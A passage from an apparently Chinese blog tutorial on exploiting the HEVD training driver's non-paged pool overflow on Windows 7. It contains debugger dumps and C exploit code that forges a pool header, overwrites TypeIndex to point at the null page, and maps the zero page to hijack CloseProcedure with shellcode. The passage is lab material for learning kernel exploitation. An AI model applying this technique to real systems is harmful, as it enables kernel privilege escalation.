</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81640</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81840</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="mi">85</span><span class="n">b81880</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="n">Hack</span>
</span></span><span class="line"><span class="cl">		<span class="n">Owning</span> <span class="nl">component</span> <span class="p">:</span> <span class="nf">Unknown</span> <span class="p">(</span><span class="n">update</span> <span class="n">pooltag</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81a80</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81ac0</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81cc0</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81d00</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81f00</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81f40</span> <span class="nl">size</span><span class="p">:</span>   <span class="n">c0</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span></span></span></code></pre></div><p>可以看到我们构建的event块刚好在函数申请的池空间下边，进而达到溢出利用条件</p>
<h4 id="池头伪造" class="heading-element">
  <a href="#%e6%b1%a0%e5%a4%b4%e4%bc%aa%e9%80%a0" class="heading-mark"></a>池头伪造</h4><p>Win7池块的结构图：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/837014_BN9SCDD2HDWUT7Y.png" alt="图片描述" srcset="/posts/2023-8-hevd/837014_BN9SCDD2HDWUT7Y.png?size=small, /posts/2023-8-hevd/837014_BN9SCDD2HDWUT7Y.png?size=medium 1.5x, /posts/2023-8-hevd/837014_BN9SCDD2HDWUT7Y.png?size=large 2x" data-title="图片描述" style="--width: 282px;--aspect-ratio: 282 / 349;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>查看每种结构：</p>
<p>只有<code>OBJECT_HEADER_QUOTA_INFO</code>的+0x4偏移处存在<code>NonPagedPoolCharge</code>成员指定pool的大小，所以<code>POOL_HEADER</code>后面是<code>OBJECT_HEADER_QUOTA_INFO</code>结构。</p>
<div class="highlight" id="id-68"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">nt</span><span class="o">!</span><span class="n">_POOL_HEADER</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PreviousSize</span>     <span class="p">:</span> <span class="n">Pos</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span> <span class="n">Bits</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PoolIndex</span>        <span class="p">:</span> <span class="n">Pos</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">7</span> <span class="n">Bits</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x002</span> <span class="nl">BlockSize</span>        <span class="p">:</span> <span class="n">Pos</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span> <span class="n">Bits</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x002</span> <span class="nl">PoolType</span>         <span class="p">:</span> <span class="n">Pos</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">7</span> <span class="n">Bits</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">Ulong1</span>           <span class="p">:</span> <span class="n">Uint4B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">PoolTag</span>          <span class="p">:</span> <span class="n">Uint4B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">AllocatorBackTraceIndex</span> <span class="p">:</span> <span class="n">Uint2B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x006</span> <span class="nl">PoolTagHash</span>      <span class="p">:</span> <span class="n">Uint2B</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_PROCESS_INFO</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_PROCESS_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">ExclusiveProcess</span> <span class="p">:</span> <span class="n">Ptr32</span> <span class="n">_EPROCESS</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">Reserved</span>         <span class="p">:</span> <span class="n">Uint4B</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_QUOTA_INFO</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_QUOTA_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PagedPoolCharge</span>  <span class="p">:</span> <span class="n">Uint4B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">NonPagedPoolCharge</span> <span class="p">:</span> <span class="n">Uint4B</span><span class="c1">////这里
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="o">+</span><span class="mh">0x008</span> <span class="nl">SecurityDescriptorCharge</span> <span class="p">:</span> <span class="n">Uint4B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00c</span> <span class="nl">SecurityDescriptorQuotaBlock</span> <span class="p">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_HANDLE_INFO</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_HANDLE_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">HandleCountDataBase</span> <span class="p">:</span> <span class="n">Ptr32</span> <span class="n">_OBJECT_HANDLE_COUNT_DATABASE</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">SingleEntry</span>      <span class="p">:</span> <span class="n">_OBJECT_HANDLE_COUNT_ENTRY</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_NAME_INFO</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_NAME_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">Directory</span>        <span class="p">:</span> <span class="n">Ptr32</span> <span class="n">_OBJECT_DIRECTORY</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">Name</span>             <span class="p">:</span> <span class="n">_UNICODE_STRING</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00c</span> <span class="nl">ReferenceCount</span>   <span class="p">:</span> <span class="n">Int4B</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_CREATOR_INFO</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_CREATOR_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">TypeList</span>         <span class="p">:</span> <span class="n">_LIST_ENTRY</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x008</span> <span class="nl">CreatorUniqueProcess</span> <span class="p">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00c</span> <span class="nl">CreatorBackTraceIndex</span> <span class="p">:</span> <span class="n">Uint2B</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00e</span> <span class="nl">Reserved</span>         <span class="p">:</span> <span class="n">Uint2B</span></span></span></code></pre></div><p>只有<code>OBJECT_HEADER_QUOTA_INFO</code>的+0x4偏移处存在<code>NonPagedPoolCharge</code>成员指定pool的大小，所以<code>POOL_HEADER</code>后面是<code>OBJECT_HEADER_QUOTA_INFO</code>结构。</p>
<p>查看下一个池块的数据对应结构：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814042659161.png" alt="image-20230814042659161" srcset="/posts/2023-8-hevd/image-20230814042659161.png?size=small, /posts/2023-8-hevd/image-20230814042659161.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814042659161.png?size=large 2x" data-title="image-20230814042659161" style="--width: 1022px;--aspect-ratio: 1022 / 251;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>查看每个结构具体成员的数据：</p>
<div class="highlight" id="id-69"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_POOL_HEADER</span> <span class="mi">85</span><span class="n">b81a80</span> 
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_POOL_HEADER</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PreviousSize</span>     <span class="p">:</span> <span class="mi">0</span><span class="n">y001000000</span> <span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PoolIndex</span>        <span class="p">:</span> <span class="mi">0</span><span class="n">y0000000</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x002</span> <span class="nl">BlockSize</span>        <span class="p">:</span> <span class="mi">0</span><span class="n">y000001000</span> <span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x002</span> <span class="nl">PoolType</span>         <span class="p">:</span> <span class="mi">0</span><span class="n">y0000010</span> <span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">Ulong1</span>           <span class="p">:</span> <span class="mh">0x4080040</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">PoolTag</span>          <span class="p">:</span> <span class="mh">0xee657645</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">AllocatorBackTraceIndex</span> <span class="p">:</span> <span class="mh">0x7645</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x006</span> <span class="nl">PoolTagHash</span>      <span class="p">:</span> <span class="mh">0xee65</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER_QUOTA_INFO</span> <span class="mi">85</span><span class="n">b81a80</span><span class="o">+</span><span class="mh">0x8</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER_QUOTA_INFO</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PagedPoolCharge</span>  <span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">NonPagedPoolCharge</span> <span class="p">:</span> <span class="mh">0x40</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x008</span> <span class="nl">SecurityDescriptorCharge</span> <span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00c</span> <span class="nl">SecurityDescriptorQuotaBlock</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">_OBJECT_HEADER</span> <span class="mi">85</span><span class="n">b81a80</span><span class="o">+</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span><span class="o">!</span><span class="n">_OBJECT_HEADER</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x000</span> <span class="nl">PointerCount</span>     <span class="p">:</span> <span class="mi">0</span><span class="n">n1</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">HandleCount</span>      <span class="p">:</span> <span class="mi">0</span><span class="n">n1</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x004</span> <span class="nl">NextToFree</span>       <span class="p">:</span> <span class="mh">0x00000001</span> <span class="n">Void</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x008</span> <span class="nl">Lock</span>             <span class="p">:</span> <span class="n">_EX_PUSH_LOCK</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00c</span> <span class="nl">TypeIndex</span>        <span class="p">:</span> <span class="mh">0xc</span> <span class="err">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00d</span> <span class="nl">TraceFlags</span>       <span class="p">:</span> <span class="mi">0</span> <span class="err">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00e</span> <span class="nl">InfoMask</span>         <span class="p">:</span> <span class="mh">0x8</span> <span class="err">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x00f</span> <span class="nl">Flags</span>            <span class="p">:</span> <span class="mi">0</span> <span class="err">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x010</span> <span class="nl">ObjectCreateInfo</span> <span class="p">:</span> <span class="mh">0x8726b940</span> <span class="n">_OBJECT_CREATE_INFORMATION</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x010</span> <span class="nl">QuotaBlockCharged</span> <span class="p">:</span> <span class="mh">0x8726b940</span> <span class="n">Void</span>
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x014</span> <span class="nl">SecurityDescriptor</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">   <span class="o">+</span><span class="mh">0x018</span> <span class="nl">Body</span>             <span class="p">:</span> <span class="n">_QUAD</span></span></span></code></pre></div><p>Win7之后，<code>OBJECT_HEADER</code>的<code>TypeIndex</code>成员的值是一个索引值，由<code>ObGetObjectType</code>函数根据索引值在<code>ObTypeIndexTable</code>数组中找到对应的值，该值是<code>OBJECT_TYPE</code>结构的起始地址：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814043316290.png" alt="image-20230814043316290" srcset="/posts/2023-8-hevd/image-20230814043316290.png?size=small, /posts/2023-8-hevd/image-20230814043316290.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814043316290.png?size=large 2x" data-title="image-20230814043316290" style="--width: 1242px;--aspect-ratio: 1242 / 765;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>点击TypeInfo成员，查看此处的结构数据，TypeInfo是一个<code>OBJECT_TYPE_INITIALIZER</code>结构体，我们关注其中的<code>CloseProcedure</code>字段，在池块释放时会调用这里的代码，所以我们将此字段覆盖为shellcode的地址即可：</p>
<p>所以我们可以通过溢出控制池块<code>_OBJECT_HEADER</code>来控制<code>TypeIndex</code>指向的地址（这里我们指向0页），然后再再零页+0x60上写入我们的shellcode地址进而达成利用。</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814043454447.png" alt="image-20230814043454447" srcset="/posts/2023-8-hevd/image-20230814043454447.png?size=small, /posts/2023-8-hevd/image-20230814043454447.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814043454447.png?size=large 2x" data-title="image-20230814043454447" style="--width: 1857px;--aspect-ratio: 1857 / 640;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h4 id="将shellcode写入0页内存" class="heading-element">
  <a href="#%e5%b0%86shellcode%e5%86%99%e5%85%a50%e9%a1%b5%e5%86%85%e5%ad%98" class="heading-mark"></a>将shellcode写入0页内存</h4><p>win7中，我们可以在用户模式下控制0页内存，所以我们将<code>OBJECT_HEADER</code>的TypeIndex索引从<code>0xc</code>修改为<code>0x0</code>：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814043641013.png" alt="image-20230814043641013" srcset="/posts/2023-8-hevd/image-20230814043641013.png?size=small, /posts/2023-8-hevd/image-20230814043641013.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814043641013.png?size=large 2x" data-title="image-20230814043641013" style="--width: 584px;--aspect-ratio: 584 / 209;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>构造池块数据时，由于只需修改<code>TypeIndex</code>，它相对于池块起始位置的偏移是0x8+0x10+0xc=0x24，大小为4，所以溢出数据长度为0x28：</p>
<p>下面是参照正常池块结构来写入的数据，只修改了<code>0x00c</code>的<code>TypeIndex</code>为<code>0x0</code>来指向零页
在<code>TriggerBufferOverflowNonPagedPool</code>内部执行完<code>memcpy()</code>后即被溢出重写<code>TypeIndex</code>为<code>0x0</code></p>
<div class="highlight" id="id-70"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">//********构造池块**********
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x04080040</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xee657645</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000040</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">PoolSize</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x00080000</span><span class="p">;</span> <span class="c1">// 这个只是将TypeIndex字段0x0c设置为0x00，这是我们溢出构造的池块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//********构造池块**********
</span></span></span></code></pre></div><h5 id="配置溢出值" class="heading-element">
  <a href="#%e9%85%8d%e7%bd%ae%e6%ba%a2%e5%87%ba%e5%80%bc" class="heading-mark"></a>配置溢出值</h5><p>由于我们的目的只是将<code>TypeIndex</code>修改即可，所以溢出值只要到达<code>TypeIndex</code>的偏移即可，而<code>TypeIndex</code>的成员偏移为<code>0x24</code>，所以我们只要溢出<code>0x24</code>大小即可</p>
<div class="highlight" id="id-71"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">int</span> <span class="n">ModifySize</span> <span class="o">=</span> <span class="mh">0x28</span><span class="p">;</span> <span class="c1">// 由于我们只要将TypeIndex修改即可，所以溢出值只要到达TypeIndex的偏移即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">int</span> <span class="n">PoolSize</span> <span class="o">=</span> <span class="mh">0x1f8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x220</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">);</span></span></span></code></pre></div><p>申请零页内存空间：</p>
<div class="highlight" id="id-72"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Zero_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">FARPROC</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="nf">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;ntdll&#34;</span><span class="p">),</span><span class="s">&#34;NtAllocateVirtualMemory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get function NtAllocateVirtualMemory!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Started to alloc zero page...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="nf">NtAllocateVirtualMemory</span><span class="p">(</span> <span class="c1">// 通过NtAllocateVirtualMemory来申请0页内存空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">Zero_addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">PAGE_READWRITE</span><span class="p">))</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">        <span class="n">Zero_addr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to alloc zero page!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
